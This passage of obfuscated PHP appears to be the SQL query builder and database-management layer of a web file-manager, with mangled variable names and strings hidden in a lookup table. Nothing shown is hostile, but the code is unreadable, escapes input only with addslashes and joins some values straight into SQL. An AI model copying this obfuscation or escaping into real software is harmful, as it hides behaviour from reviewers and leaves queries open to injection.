$†Í™±×±[327])) { $ƒ»ó© Õ = explode($†Í™±×±[327], $•Ë¹ÇÊ); $ã×¯ÉÛı = array(); foreach ($ƒ»ó© Õ as $ñûÓ×°— => $ğ¬ãû•‹) { $ƒ²Ç†Î¥ = $£Úà°ÌÕ ? $É•ÛÉË[$ñûÓ×°—] : $É•ÛÉË; $ã×¯ÉÛı[] = $†Í™±×±[303] . $this->parseWhereItem($this->parseKey($ğ¬ãû•‹), $ƒ²Ç†Î¥) . $†Í™±×±[936]; } $åğ„¦ƒ .= implode($†Í™±×±[1035], $ã×¯ÉÛı); } else { $åğ„¦ƒ .= $this->parseWhereItem($this->parseKey($•Ë¹ÇÊ), $É•ÛÉË); } } $åğ„¦ƒ .= $†Í™±×±[321] . $Ğ‡–ª‡Í; } $åğ„¦ƒ = substr($åğ„¦ƒ, 0, -strlen($Ğ‡–ª‡Í)); } return empty($åğ„¦ƒ) ? $†Í™±×±[12] : $†Í™±×±[1041] . $åğ„¦ƒ; } protected function parseWhereItem($Ü‰¡€˜ó, $ıÍ¢ÅÔ) { $•˜šÙ¦ã =& $_SERVER[”ôÑ§ì¸]; $×û¼í¾ = $•˜šÙ¦ã[12]; if (is_array($ıÍ¢ÅÔ)) { if (is_string($ıÍ¢ÅÔ[0])) { $¤¤µéĞÈ = strtolower($ıÍ¢ÅÔ[0]); if (in_array($ıÍ¢ÅÔ[0], array($•˜šÙ¦ã[915], $•˜šÙ¦ã[1042], $•˜šÙ¦ã[1043], $•˜šÙ¦ã[1044], $•˜šÙ¦ã[1045], $•˜šÙ¦ã[1046]))) { $×û¼í¾ .= $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $ıÍ¢ÅÔ[0] . $•˜šÙ¦ã[53] . $this->parseValue($ıÍ¢ÅÔ[1]); } elseif (preg_match($•˜šÙ¦ã[1047], $ıÍ¢ÅÔ[0])) { $×û¼í¾ .= $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $this->exp[$¤¤µéĞÈ] . $•˜šÙ¦ã[53] . $this->parseValue($ıÍ¢ÅÔ[1]); } elseif (preg_match($•˜šÙ¦ã[1048], $ıÍ¢ÅÔ[0])) { if (is_array($ıÍ¢ÅÔ[1])) { $ÜÏ±¹Ûà = isset($ıÍ¢ÅÔ[2]) ? strtoupper($ıÍ¢ÅÔ[2]) : $•˜šÙ¦ã[1033]; if (in_array($ÜÏ±¹Ûà, array($•˜šÙ¦ã[1032], $•˜šÙ¦ã[1033], $•˜šÙ¦ã[1034]))) { $ºˆÌŠ–ø = array(); foreach ($ıÍ¢ÅÔ[1] as $ØÄÏØÄÅ) { $ºˆÌŠ–ø[] = $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $this->exp[$¤¤µéĞÈ] . $•˜šÙ¦ã[53] . $this->parseValue($ØÄÏØÄÅ); } $×û¼í¾ .= $•˜šÙ¦ã[303] . implode($•˜šÙ¦ã[53] . $ÜÏ±¹Ûà . $•˜šÙ¦ã[53], $ºˆÌŠ–ø) . $•˜šÙ¦ã[936]; } } else { $×û¼í¾ .= $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $this->exp[$¤¤µéĞÈ] . $•˜šÙ¦ã[53] . $this->parseValue($ıÍ¢ÅÔ[1]); } } elseif ($•˜šÙ¦ã[340] == $¤¤µéĞÈ) { $×û¼í¾ .= $•˜šÙ¦ã[934] . $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $ıÍ¢ÅÔ[1] . $•˜šÙ¦ã[1049]; } elseif (preg_match($•˜šÙ¦ã[1050], $ıÍ¢ÅÔ[0])) { $×û¼í¾ .= $ıÍ¢ÅÔ[0]; } elseif (preg_match($•˜šÙ¦ã[1051], $ıÍ¢ÅÔ[0])) { if (isset($ıÍ¢ÅÔ[2]) && $•˜šÙ¦ã[340] == $ıÍ¢ÅÔ[2]) { $×û¼í¾ .= $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $this->exp[$¤¤µéĞÈ] . $•˜šÙ¦ã[53] . $ıÍ¢ÅÔ[1]; } else { if (is_string($ıÍ¢ÅÔ[1])) { $ıÍ¢ÅÔ[1] = explode($•˜šÙ¦ã[50], $ıÍ¢ÅÔ[1]); } $ÃİÊŸØ¹ = implode($•˜šÙ¦ã[50], $this->parseValue($ıÍ¢ÅÔ[1])); $×û¼í¾ .= $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $this->exp[$¤¤µéĞÈ] . $•˜šÙ¦ã[934] . $ÃİÊŸØ¹ . $•˜šÙ¦ã[936]; } } elseif (preg_match($•˜šÙ¦ã[1052], $ıÍ¢ÅÔ[0])) { $§ßÙ´€™ = is_string($ıÍ¢ÅÔ[1]) ? explode($•˜šÙ¦ã[50], $ıÍ¢ÅÔ[1]) : $ıÍ¢ÅÔ[1]; $×û¼í¾ .= $•˜šÙ¦ã[934] . $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $this->exp[$¤¤µéĞÈ] . $•˜šÙ¦ã[53] . $this->parseValue($§ßÙ´€™[0]) . $•˜šÙ¦ã[1035] . $this->parseValue($§ßÙ´€™[1]) . $•˜šÙ¦ã[321]; } else { think_exception(think_lang($•˜šÙ¦ã[1038]) . $•˜šÙ¦ã[4] . $ıÍ¢ÅÔ[0]); } } else { $µûƒ‹à = count($ıÍ¢ÅÔ); $ÅÃ«Â¢ø = $•˜šÙ¦ã[12]; if (is_string($ıÍ¢ÅÔ[$µûƒ‹à - 1])) { $ÅÃ«Â¢ø = isset($ıÍ¢ÅÔ[$µûƒ‹à - 1]) ? strtoupper($ıÍ¢ÅÔ[$µûƒ‹à - 1]) : $•˜šÙ¦ã[12]; if (in_array($ÅÃ«Â¢ø, array($•˜šÙ¦ã[1032], $•˜šÙ¦ã[1033], $•˜šÙ¦ã[1034]))) { $µûƒ‹à = $µûƒ‹à - 1; } } else { $ÅÃ«Â¢ø = $•˜šÙ¦ã[1032]; } for ($ø‚óİŒå = 0; $ø‚óİŒå < $µûƒ‹à; $ø‚óİŒå++) { $§ßÙ´€™ = is_array($ıÍ¢ÅÔ[$ø‚óİŒå]) ? $ıÍ¢ÅÔ[$ø‚óİŒå][1] : $ıÍ¢ÅÔ[$ø‚óİŒå]; if ($•˜šÙ¦ã[340] == strtolower($ıÍ¢ÅÔ[$ø‚óİŒå][0])) { $×û¼í¾ .= $•˜šÙ¦ã[303] . $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $§ßÙ´€™ . $•˜šÙ¦ã[1049] . $ÅÃ«Â¢ø . $•˜šÙ¦ã[53]; } else { $Î÷Ñ¾ˆ¦ = is_array($ıÍ¢ÅÔ[$ø‚óİŒå]) ? $this->exp[strtolower($ıÍ¢ÅÔ[$ø‚óİŒå][0])] : $•˜šÙ¦ã[915]; if (!$Î÷Ñ¾ˆ¦ && is_array($ıÍ¢ÅÔ[$ø‚óİŒå]) && in_array($ıÍ¢ÅÔ[$ø‚óİŒå][0], array($•˜šÙ¦ã[915], $•˜šÙ¦ã[1042], $•˜šÙ¦ã[1043], $•˜šÙ¦ã[1044], $•˜šÙ¦ã[1045], $•˜šÙ¦ã[1046]))) { $Î÷Ñ¾ˆ¦ = $ıÍ¢ÅÔ[$ø‚óİŒå][0]; } $×û¼í¾ .= $•˜šÙ¦ã[303] . $Ü‰¡€˜ó . $•˜šÙ¦ã[53] . $Î÷Ñ¾ˆ¦ . $•˜šÙ¦ã[53] . $this->parseValue($§ßÙ´€™) . $•˜šÙ¦ã[1049] . $ÅÃ«Â¢ø . $•˜šÙ¦ã[53]; } } $×û¼í¾ = substr($×û¼í¾, 0, -4); } } else { $×û¼í¾ .= $Ü‰¡€˜ó . $•˜šÙ¦ã[1053] . $this->parseValue($ıÍ¢ÅÔ); } return $×û¼í¾; } protected function parseThinkWhere($ÑİÑàáÜ, $ØŒÏ­øò) { $’ñÑ¸â =& $_SERVER[”ôÑ§ì¸]; $ĞİŸ  = $’ñÑ¸â[12]; switch ($ÑİÑàáÜ) { case $’ñÑ¸â[395]: $ĞİŸ  = $ØŒÏ­øò; break; case $’ñÑ¸â[1036]: $ĞİŸ  = is_string($ØŒÏ­øò) ? $ØŒÏ­øò : substr($this->parseWhere($ØŒÏ­øò), 6); break; case $’ñÑ¸â[1054]: parse_str($ØŒÏ­øò, $Ã¼µ¦¿ç); if (isset($Ã¼µ¦¿ç[$’ñÑ¸â[1031]])) { $°¯ßĞìí = $’ñÑ¸â[53] . strtoupper($Ã¼µ¦¿ç[$’ñÑ¸â[1031]]) . $’ñÑ¸â[53]; unset($Ã¼µ¦¿ç[$’ñÑ¸â[1031]]); } else { $°¯ßĞìí = $’ñÑ¸â[1035]; } $ÁÖß«—† = array(); foreach ($Ã¼µ¦¿ç as $§äÒÖ‚Á => $îÛ‰§ğ²) { $ÁÖß«—†[] = $this->parseKey($§äÒÖ‚Á) . $’ñÑ¸â[1053] . $this->parseValue($îÛ‰§ğ²); } $ĞİŸ  = implode($°¯ßĞìí, $ÁÖß«—†); break; } return $ĞİŸ ; } protected function parseLimit($üÓÄˆ²ô) { $÷‚¥Å¸¤ =& $_SERVER[”ôÑ§ì¸]; return !empty($üÓÄˆ²ô) ? $÷‚¥Å¸¤[51] . $üÓÄˆ²ô . $÷‚¥Å¸¤[53] : $÷‚¥Å¸¤[12]; } protected function parseJoin($Û×Åñè±) { $’Š²·á =& $_SERVER[”ôÑ§ì¸]; $¯œ‹ ë‡ = $’Š²·á[12]; if (!empty($Û×Åñè±)) { if (is_array($Û×Åñè±)) { foreach ($Û×Åñè± as $Éã¾™»ë => $´¼ØÔ†Á) { if (!1 !== stripos($´¼ØÔ†Á, $’Š²·á[1055])) { $¯œ‹ ë‡ .= $’Š²·á[53] . $´¼ØÔ†Á; } else { $¯œ‹ ë‡ .= $’Š²·á[1056] . $´¼ØÔ†Á; } } } else { $¯œ‹ ë‡ .= $’Š²·á[1056] . $Û×Åñè±; } } $¯œ‹ ë‡ = preg_replace($’Š²·á[1057], think_config($’Š²·á[961]) . $’Š²·á[1058], $¯œ‹ ë‡); return $¯œ‹ ë‡; } protected function parseOrder($¹·èÜÀÁ) { $±ìœŞ°Ç =& $_SERVER[”ôÑ§ì¸]; if (is_array($¹·èÜÀÁ)) { $¼ŸØÀ‹Û = array(); foreach ($¹·èÜÀÁ as $øë¨–ù© => $È„é™×ø) { if (is_numeric($øë¨–ù©)) { $¼ŸØÀ‹Û[] = $this->parseKey($È„é™×ø); } else { $È„é™×ø = in_array(strtoupper(trim($È„é™×ø)), array($±ìœŞ°Ç[1059], $±ìœŞ°Ç[1060])) ? $±ìœŞ°Ç[53] . $È„é™×ø : $±ìœŞ°Ç[12]; if (preg_match($±ìœŞ°Ç[1061], $øë¨–ù©)) { $¼ŸØÀ‹Û[] = $this->parseKey($øë¨–ù©) . $È„é™×ø; } else { think_exception($±ìœŞ°Ç[1062] . $øë¨–ù©); } } } $¹·èÜÀÁ = implode($±ìœŞ°Ç[50], $¼ŸØÀ‹Û); } return !empty($¹·èÜÀÁ) ? $±ìœŞ°Ç[1063] . $¹·èÜÀÁ : $±ìœŞ°Ç[12]; } protected function parseGroup($Á«Ğè† ) { $…”Œ®çÏ =& $_SERVER[”ôÑ§ì¸]; return !empty($Á«Ğè† ) ? $…”Œ®çÏ[1064] . $Á«Ğè†  : $…”Œ®çÏ[12]; } protected function parseHaving($İ¯µÍ¤¢) { $‰˜º¬ğ =& $_SERVER[”ôÑ§ì¸]; return !empty($İ¯µÍ¤¢) ? $‰˜º¬ğ[1065] . $İ¯µÍ¤¢ : $‰˜º¬ğ[12]; } protected function parseComment($ı½¦ò’¸) { $öÅÕõ¶Ú =& $_SERVER[”ôÑ§ì¸]; return !empty($ı½¦ò’¸) ? $öÅÕõ¶Ú[1066] . $ı½¦ò’¸ . $öÅÕõ¶Ú[1067] : $öÅÕõ¶Ú[12]; } protected function parseDistinct($è·íÒĞ¹) { $°†‚ÑŸÁ =& $_SERVER[”ôÑ§ì¸]; return !empty($è·íÒĞ¹) ? $°†‚ÑŸÁ[1068] : $°†‚ÑŸÁ[12]; } protected function parseUnion($ÕÖëÙË) { $ÄÊø²úö =& $_SERVER[”ôÑ§ì¸]; if (empty($ÕÖëÙË)) { return $ÄÊø²úö[12]; } if (isset($ÕÖëÙË[$ÄÊø²úö[391]])) { $†éê²ï = $ÄÊø²úö[1069]; unset($ÕÖëÙË[$ÄÊø²úö[391]]); } else { $†éê²ï = $ÄÊø²úö[1070]; } foreach ($ÕÖëÙË as $İÌ¤ûÛÓ) { $¸Åå­´Ù[] = $†éê²ï . (is_array($İÌ¤ûÛÓ) ? $this->buildSelectSql($İÌ¤ûÛÓ) : $İÌ¤ûÛÓ); } return implode($ÄÊø²úö[53], $¸Åå­´Ù); } public function insert($òï¡ıÎã, $Ï´‘ìßö = array(), $ˆÆªÕó“ = false) { $ú…ìÒŠ =& $_SERVER[”ôÑ§ì¸]; $²Å»÷½¤ = $Éëğ™¢Î = array(); $this->model = $Ï´‘ìßö[$ú…ìÒŠ[324]]; foreach ($òï¡ıÎã as $€Ê™ú¦Î => $œƒ½§Ô£) { if (is_array($œƒ½§Ô£) && $ú…ìÒŠ[340] == $œƒ½§Ô£[0]) { $Éëğ™¢Î[] = $this->parseKey($€Ê™ú¦Î); $²Å»÷½¤[] = $œƒ½§Ô£[1]; } elseif (is_scalar($œƒ½§Ô£) || is_null($œƒ½§Ô£)) { $Éëğ™¢Î[] = $this->parseKey($€Ê™ú¦Î); $²Å»÷½¤[] = $this->parseValue($œƒ½§Ô£); } } $á†é¥é = ($ˆÆªÕó“ ? $ú…ìÒŠ[938] : $ú…ìÒŠ[939]) . $ú…ìÒŠ[940] . $this->parseTable($Ï´‘ìßö[$ú…ìÒŠ[322]]) . $ú…ìÒŠ[934] . implode($ú…ìÒŠ[50], $Éëğ™¢Î) . $ú…ìÒŠ[935] . implode($ú…ìÒŠ[50], $²Å»÷½¤) . $ú…ìÒŠ[936]; $á†é¥é .= $this->parseLock(isset($Ï´‘ìßö[$ú…ìÒŠ[874]]) ? $Ï´‘ìßö[$ú…ìÒŠ[874]] : !1); $á†é¥é .= $this->parseComment(!empty($Ï´‘ìßö[$ú…ìÒŠ[397]]) ? $Ï´‘ìßö[$ú…ìÒŠ[397]] : $ú…ìÒŠ[12]); return $this->execute($á†é¥é, $this->parseBind(!empty($Ï´‘ìßö[$ú…ìÒŠ[328]]) ? $Ï´‘ìßö[$ú…ìÒŠ[328]] : array())); } public function selectInsert($£öå«¬Ó, $øßÏ”›¤, $Ô”¥š˜Ö = array()) { $»ş¼‡óË =& $_SERVER[”ôÑ§ì¸]; $this->model = $Ô”¥š˜Ö[$»ş¼‡óË[324]]; if (is_string($£öå«¬Ó)) { $£öå«¬Ó = explode($»ş¼‡óË[50], $£öå«¬Ó); } array_walk($£öå«¬Ó, array($this, $»ş¼‡óË[937])); $¾Î·ïÚğ = $»ş¼‡óË[1071] . $this->parseTable($øßÏ”›¤) . $»ş¼‡óË[934] . implode($»ş¼‡óË[50], $£öå«¬Ó) . $»ş¼‡óË[1049]; $¾Î·ïÚğ .= $this->buildSelectSql($Ô”¥š˜Ö); return $this->execute($¾Î·ïÚğ, $this->parseBind(!empty($Ô”¥š˜Ö[$»ş¼‡óË[328]]) ? $Ô”¥š˜Ö[$»ş¼‡óË[328]] : array())); } public function update($²úıü“Ø, $±Ëùãê) { $ğ›Õ¥Ä =& $_SERVER[”ôÑ§ì¸]; $this->model = $±Ëùãê[$ğ›Õ¥Ä[324]]; $˜µÔÙÉÇ = $ğ›Õ¥Ä[1072] . $this->parseTable($±Ëùãê[$ğ›Õ¥Ä[322]]) . $this->parseSet($²úıü“Ø) . $this->parseWhere(!empty($±Ëùãê[$ğ›Õ¥Ä[318]]) ? $±Ëùãê[$ğ›Õ¥Ä[318]] : $ğ›Õ¥Ä[12]) . $this->parseOrder(!empty($±Ëùãê[$ğ›Õ¥Ä[408]]) ? $±Ëùãê[$ğ›Õ¥Ä[408]] : $ğ›Õ¥Ä[12]) . $this->parseLimit(!empty($±Ëùãê[$ğ›Õ¥Ä[335]]) ? $±Ëùãê[$ğ›Õ¥Ä[335]] : $ğ›Õ¥Ä[12]) . $this->parseLock(isset($±Ëùãê[$ğ›Õ¥Ä[874]]) ? $±Ëùãê[$ğ›Õ¥Ä[874]] : !1) . $this->parseComment(!empty($±Ëùãê[$ğ›Õ¥Ä[397]]) ? $±Ëùãê[$ğ›Õ¥Ä[397]] : $ğ›Õ¥Ä[12]); return $this->execute($˜µÔÙÉÇ, $this->parseBind(!empty($±Ëùãê[$ğ›Õ¥Ä[328]]) ? $±Ëùãê[$ğ›Õ¥Ä[328]] : array())); } public function delete($ø‹ü¤ = array()) { $Óº˜ä‹Á =& $_SERVER[”ôÑ§ì¸]; $this->model = $ø‹ü¤[$Óº˜ä‹Á[324]]; $ç´¶¾õÌ = $Óº˜ä‹Á[1073] . $this->parseTable($ø‹ü¤[$Óº˜ä‹Á[322]]) . $this->parseWhere(!empty($ø‹ü¤[$Óº˜ä‹Á[318]]) ? $ø‹ü¤[$Óº˜ä‹Á[318]] : $Óº˜ä‹Á[12]) . $this->parseOrder(!empty($ø‹ü¤[$Óº˜ä‹Á[408]]) ? $ø‹ü¤[$Óº˜ä‹Á[408]] : $Óº˜ä‹Á[12]) . $this->parseLimit(!empty($ø‹ü¤[$Óº˜ä‹Á[335]]) ? $ø‹ü¤[$Óº˜ä‹Á[335]] : $Óº˜ä‹Á[12]) . $this->parseLock(isset($ø‹ü¤[$Óº˜ä‹Á[874]]) ? $ø‹ü¤[$Óº˜ä‹Á[874]] : !1) . $this->parseComment(!empty($ø‹ü¤[$Óº˜ä‹Á[397]]) ? $ø‹ü¤[$Óº˜ä‹Á[397]] : $Óº˜ä‹Á[12]); return $this->execute($ç´¶¾õÌ, $this->parseBind(!empty($ø‹ü¤[$Óº˜ä‹Á[328]]) ? $ø‹ü¤[$Óº˜ä‹Á[328]] : array())); } public function select($Ùş©¾è = array()) { $¥™¦òÛ =& $_SERVER[”ôÑ§ì¸]; $this->model = $Ùş©¾è[$¥™¦òÛ[324]]; $úĞÃî„» = $this->buildSelectSql($Ùş©¾è); $„¶ĞÉª× = isset($Ùş©¾è[$¥™¦òÛ[392]]) ? $Ùş©¾è[$¥™¦òÛ[392]] : !1; if ($„¶ĞÉª×) { $àêÖ÷´À = is_string($„¶ĞÉª×[$¥™¦òÛ[94]]) ? $„¶ĞÉª×[$¥™¦òÛ[94]] : $¥™¦òÛ[1074] . md5($úĞÃî„»); $º‘›ä› = think_cache($àêÖ÷´À, $¥™¦òÛ[12], $„¶ĞÉª×); if (!1 !== $º‘›ä›) { return $º‘›ä›; } } $Ğ¯ô­ö = $this->query($úĞÃî„», $this->parseBind(!empty($Ùş©¾è[$¥™¦òÛ[328]]) ? $Ùş©¾è[$¥™¦òÛ[328]] : array())); if ($„¶ĞÉª× && !1 !== $Ğ¯ô­ö) { think_cache($àêÖ÷´À, $Ğ¯ô­ö, $„¶ĞÉª×); } return $Ğ¯ô­ö; } public function buildSelectSql($‘­ñÎ¥Ù = array()) { $Íº¬ˆ„¹ =& $_SERVER[”ôÑ§ì¸]; if (isset($‘­ñÎ¥Ù[$Íº¬ˆ„¹[396]])) { if (strpos($‘­ñÎ¥Ù[$Íº¬ˆ„¹[396]], $Íº¬ˆ„¹[50])) { list($şÏŞŞï, $ú»ğ’›) = explode($Íº¬ˆ„¹[50], $‘­ñÎ¥Ù[$Íº¬ˆ„¹[396]]); } else { $şÏŞŞï = $‘­ñÎ¥Ù[$Íº¬ˆ„¹[396]]; } $şÏŞŞï = $şÏŞŞï ? $şÏŞŞï : 1; $ú»ğ’› = isset($ú»ğ’›) ? $ú»ğ’› : (is_numeric($‘­ñÎ¥Ù[$Íº¬ˆ„¹[335]]) ? $‘­ñÎ¥Ù[$Íº¬ˆ„¹[335]] : 20); $£ì¬“¼ = $ú»ğ’› * ((int) $şÏŞŞï - 1); $‘­ñÎ¥Ù[$Íº¬ˆ„¹[335]] = $£ì¬“¼ . $Íº¬ˆ„¹[50] . $ú»ğ’›; } if (think_config($Íº¬ˆ„¹[1075])) { $©«Ä™àà = $Íº¬ˆ„¹[1076] . md5(serialize($‘­ñÎ¥Ù)); $úş„×‰ = think_cache($©«Ä™àà); if ($úş„×‰) { return $úş„×‰; } } $ûë¢¼É = $this->parseSql($this->selectSql, $‘­ñÎ¥Ù); $ûë¢¼É .= $this->parseLock(isset($‘­ñÎ¥Ù[$Íº¬ˆ„¹[874]]) ? $‘­ñÎ¥Ù[$Íº¬ˆ„¹[874]] : !1); if (isset($©«Ä™àà)) { think_cache($©«Ä™àà, $ûë¢¼É); } return $ûë¢¼É; } public function parseSql($ ˆ‰Æ€¬, $‚Š´š•ó = array()) { $¯şùÑ¤ª =& $_SERVER[”ôÑ§ì¸]; $ ˆ‰Æ€¬ = str_replace(array($¯şùÑ¤ª[1077], $¯şùÑ¤ª[1078], $¯şùÑ¤ª[1079], $¯şùÑ¤ª[1080], $¯şùÑ¤ª[1081], $¯şùÑ¤ª[1082], $¯şùÑ¤ª[1083], $¯şùÑ¤ª[1084], $¯şùÑ¤ª[1085], $¯şùÑ¤ª[1086], $¯şùÑ¤ª[1087]), array($this->parseTable("{$‚Š´š•ó[$¯şùÑ¤ª[322]]}"), $this->parseDistinct(isset($‚Š´š•ó[$¯şùÑ¤ª[1088]]) ? $‚Š´š•ó[$¯şùÑ¤ª[1088]] : !1), $this->parseField(!empty($‚Š´š•ó[$¯şùÑ¤ª[316]]) ? $‚Š´š•ó[$¯şùÑ¤ª[316]] : $¯şùÑ¤ª[202]), $this->parseJoin(!empty($‚Š´š•ó[$¯şùÑ¤ª[325]]) ? $‚Š´š•ó[$¯şùÑ¤ª[325]] : $¯şùÑ¤ª[12]), $this->parseWhere(!empty($‚Š´š•ó[$¯şùÑ¤ª[318]]) ? $‚Š´š•ó[$¯şùÑ¤ª[318]] : $¯şùÑ¤ª[12]), $this->parseGroup(!empty($‚Š´š•ó[$¯şùÑ¤ª[546]]) ? $‚Š´š•ó[$¯şùÑ¤ª[546]] : $¯şùÑ¤ª[12]), $this->parseHaving(!empty($‚Š´š•ó[$¯şùÑ¤ª[1089]]) ? $‚Š´š•ó[$¯şùÑ¤ª[1089]] : $¯şùÑ¤ª[12]), $this->parseOrder(!empty($‚Š´š•ó[$¯şùÑ¤ª[408]]) ? $‚Š´š•ó[$¯şùÑ¤ª[408]] : $¯şùÑ¤ª[12]), $this->parseLimit(!empty($‚Š´š•ó[$¯şùÑ¤ª[335]]) ? $‚Š´š•ó[$¯şùÑ¤ª[335]] : $¯şùÑ¤ª[12]), $this->parseUnion(!empty($‚Š´š•ó[$¯şùÑ¤ª[390]]) ? $‚Š´š•ó[$¯şùÑ¤ª[390]] : $¯şùÑ¤ª[12]), $this->parseComment(!empty($‚Š´š•ó[$¯şùÑ¤ª[397]]) ? $‚Š´š•ó[$¯şùÑ¤ª[397]] : $¯şùÑ¤ª[12])), $ ˆ‰Æ€¬); return $ ˆ‰Æ€¬; } public function getLastSql($Úê„Û…ã = '') { return $Úê„Û…ã ? $this->modelSql[$Úê„Û…ã] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($åÚÜï“¯) { return addslashes($åÚÜï“¯); } public function setModel($¼áéØäÈ) { $this->model = $¼áéØäÈ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($®ĞÏ½ü× = array()) { $™³åªı =& $_SERVER[”ôÑ§ì¸]; if (empty($®ĞÏ½ü×)) { $®ĞÏ½ü× = $GLOBALS[$™³åªı[6]][$™³åªı[21]]; } $this->database = $®ĞÏ½ü×; } public function model($¦ˆ™¨ª¨ = '') { return new ModelBase($¦ˆ™¨ª¨, $_SERVER[”ôÑ§ì¸][12], $this->database); } public function db($Ù‹Í×õğ = false) { $àÊ„İŠ³ =& $_SERVER[”ôÑ§ì¸]; $¤–°Ğ = array_change_key_case($this->database); if ($this->dbType() == $àÊ„İŠ³[13] || !$Ù‹Í×õğ) { return $this->model()->db(); } $Ã¡ÊĞ•â = $¤–°Ğ[$àÊ„İŠ³[1003]]; $¤–°Ğ[$àÊ„İŠ³[1003]] = $àÊ„İŠ³[12]; if ($¤–°Ğ[$àÊ„İŠ³[998]] == $àÊ„İŠ³[995]) { $Êî¯•¨è = $¤–°Ğ[$àÊ„İŠ³[1004]]; $¤–°Ğ[$àÊ„İŠ³[1004]] = substr($Êî¯•¨è, 0, strrpos($Êî¯•¨è, $àÊ„İŠ³[1090])); } $this->database = $¤–°Ğ; $Ãü¨Å¦Ş = $this->model()->db(); try { $ÆöÖ·• = $Ãü¨Å¦Ş->execute("\x73\x68\157\x77\x20\144\141\164\141\142\x61\163\145\163\x20\x6c\151\x6b\x65\x20\x27{$Ã¡ÊĞ•â}\47"); } catch (Exception $”ò…µÀâ) { } if (!$ÆöÖ·•) { $Ãü¨Å¦Ş->execute("\x63\162\x65\141\164\x65\x20\x64\141\x74\x61\142\141\x73\x65\x20\x60{$Ã¡ÊĞ•â}\x60"); } $¤–°Ğ[$àÊ„İŠ³[1003]] = $Ã¡ÊĞ•â; if ($¤–°Ğ[$àÊ„İŠ³[998]] == $àÊ„İŠ³[995]) { $¤–°Ğ[$àÊ„İŠ³[1004]] .= $àÊ„İŠ³[1090] . $Ã¡ÊĞ•â; } $this->database = $¤–°Ğ; $Ãü¨Å¦Ş->execute("\x75\163\x65\40\140{$Ã¡ÊĞ•â}\140"); return $Ãü¨Å¦Ş; } public function createTable($‡¶Ê„¯‘, &$ ğëÑ) { $Íëó™µ° =& $_SERVER[”ôÑ§ì¸]; if (!IO::exist($‡¶Ê„¯‘)) { ActionCall($Íëó™µ°[1091], !0, 0); show_json(LNG($Íëó™µ°[1092]), !1); } $†ŞôŒ‰³ = $this->model()->db(); $ˆò¦Ş§¹ = sqlSplit(IO::getContent($‡¶Ê„¯‘)); foreach ($ˆò¦Ş§¹ as $šşï˜±—) { $Ì…ÚúòÃ = stripos($šşï˜±—, $Íëó™µ°[1093]) === 0; if ($Ì…ÚúòÃ) { $ ğëÑ->task[$Íëó™µ°[808]] += 1; } $†ŞôŒ‰³->execute($šşï˜±—); if ($Ì…ÚúòÃ) { preg_match($Íëó™µ°[1094], $šşï˜±—, $Ï˜±ò¥£); $ ğëÑ->task[$Íëó™µ°[1095]] = $Ï˜±ò¥£[1]; $ ğëÑ->update(1); } } } public function insertTable($«¿¯‹Æ–, &$¸ùğµêú) { $Ì²‚Ä¿İ =& $_SERVER[”ôÑ§ì¸]; $Äé‚¤Æ = $this->model()->db(); $Æ©àï‡ = $‰½‹Òö¦ ? array($‰½‹Òö¦) : $Äé‚¤Æ->getTables(); foreach ($«¿¯‹Æ– as $†«òËÊæ) { $‰½‹Òö¦ = basename($†«òËÊæ, $Ì²‚Ä¿İ[810]); if (!in_array($‰½‹Òö¦, $Æ©àï‡)) { continue; } $¸ùğµêú->task[$Ì²‚Ä¿İ[1095]] = $‰½‹Òö¦; if (get_filesize($†«òËÊæ) == 0) { continue; } $ŸõÊ• = $this->sqlToDb($†«òËÊæ, $¸ùğµêú); if (!$ŸõÊ•) { ActionCall($Ì²‚Ä¿İ[1091], !0, 0); show_json(LNG($Ì²‚Ä¿İ[1096]) . "\x5b{$‰½‹Òö¦}\x5d", !1); } } } public function sqlFromDb($°ô¯Ôá, $ØÈ€Š³¬, &$¤˜¬°Ìê, $®¯ä×ï€ = '') { if ($¤˜¬°Ìê) { $¤˜¬°Ìê->task[$_SERVER[”ôÑ§ì¸][1095]] = $°ô¯Ôá; } $Ñ§Éº£¿ = $this->model($°ô¯Ôá); $ïÏÕœ–´ = 0; $²„ı” = 0; $İé¢‰†É = 10000; $óóõï„Ş = fopen($ØÈ€Š³¬, $_SERVER[”ôÑ§ì¸][1097]); $øš›úÉú = $Ñ§Éº£¿->getPk(); $¨ˆ¶Ÿ‡Ä = $Ñ§Éº£¿->getDbFields(); $¥Î±¥¼Û = $_SERVER[”ôÑ§ì¸][12]; if ($GLOBALS[$_SERVER[”ôÑ§ì¸][809]] && in_array($°ô¯Ôá, array($_SERVER[”ôÑ§ì¸][1098], $_SERVER[”ôÑ§ì¸][1099]))) { $¥Î±¥¼Û = $°ô¯Ôá; } do { $šÑ—Ëò“ = array($øš›úÉú => array($_SERVER[”ôÑ§ì¸][1045], $²„ı”)); $»¢Á™ş = $Ñ§Éº£¿->where($šÑ—Ëò“)->field($¨ˆ¶Ÿ‡Ä)->order($øš›úÉú . $_SERVER[”ôÑ§ì¸][1100])->limit($İé¢‰†É)->select(); $»¢Á™ş = !empty($»¢Á™ş) ? $»¢Á™ş : array(); if (!($õšÖ¿Š¡ = count($»¢Á™ş))) { break; } $œ¢úíºÖ = end($»¢Á™ş); $²„ı” = $œ¢úíºÖ[$øš›úÉú]; $ñÁÜªß§ = array(); foreach ($»¢Á™ş as $Ã—ğÒ½Š) { if ($¥Î±¥¼Û) { if ($°ô¯Ôá == $_SERVER[”ôÑ§ì¸][1098]) { if ($Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][33]] == $_SERVER[”ôÑ§ì¸][1101]) { $‘¸Éˆíü = json_decode($Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][417]], !0); if ($‘¸Éˆíü[$_SERVER[”ôÑ§ì¸][32]] == $GLOBALS[$_SERVER[”ôÑ§ì¸][809]] && $‘¸Éˆíü[$_SERVER[”ôÑ§ì¸][772]] != 1) { continue; } } } else { if ($Ã—ğÒ½Š[$_SERVER[”ôÑ§ì¸][33]] == $_SERVER[”ôÑ§ì¸][1102] && 